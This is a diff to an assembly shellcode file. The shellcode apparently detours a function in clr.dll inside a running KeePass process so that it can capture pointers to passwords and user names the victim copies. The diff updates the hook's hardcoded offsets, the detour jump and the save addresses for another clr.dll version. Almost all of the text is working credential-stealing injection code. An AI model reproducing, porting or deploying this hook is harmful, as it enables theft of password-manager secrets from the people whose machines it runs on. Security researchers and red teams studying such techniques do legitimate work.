@@ -12,14 +12,14 @@
 
 ; Important: The "movabs qword ptr" instructions require PAGE_EXECUTE_READWRITE to be applied to the shellcode's memory region.
 ; Important: Copying user names (via KeePass's Ctrl+B shortcut, for example) will be considered passwords by the shellcode, so consider that some passwords may actually be be user names.
-; Important: Hardcoded offsets are used (e.g. jmp $clr.70D96C) and would need to be updated to support other versions of clr.dll.
+; Important: Hardcoded offsets are used (e.g. jmp $clr.70D6AC) and would need to be updated to support other versions of clr.dll.
 
 
 ; Hook
 ; ----
 
-; clr.dll:$70D96C
-<$clr.70D96C>
+; clr.dll:$70D6AC
+<$clr.70D6AC>
 
 ; Original instruction
 mov byte ptr ss:[rsp+0x60], 0x0
@@ -52,7 +52,7 @@ je @ret
 
 ; Success (password info)
 @save_pointer_password:
-movabs qword ptr [$clr.70D964], rax
+movabs qword ptr [$clr.70D6A4], rax
 jmp @ret
 
 ; Continue to check if info
@@ -65,17 +65,17 @@ jne @ret
 
 ; Success (pointer info)
 @save_pointer_info:
-movabs qword ptr [$clr.70D95C], rax
+movabs qword ptr [$clr.70D69C], rax
 
 ; Return to clr.dll
 @ret:
-jmp $clr.A7E70
+jmp $clr.10F110
 
 
 ; Detour
 ; ------
 
-; clr.dll:$A7E6B
-<$clr.A7E6B>
+; clr.dll:$10F10B
+<$clr.10F10B>
 ; Conveniently, this jmp to Hook takes up 5 bytes - the same as original instruction (C6 44 24 60 00)
-jmp $clr.70D96C
+jmp $clr.70D6AC
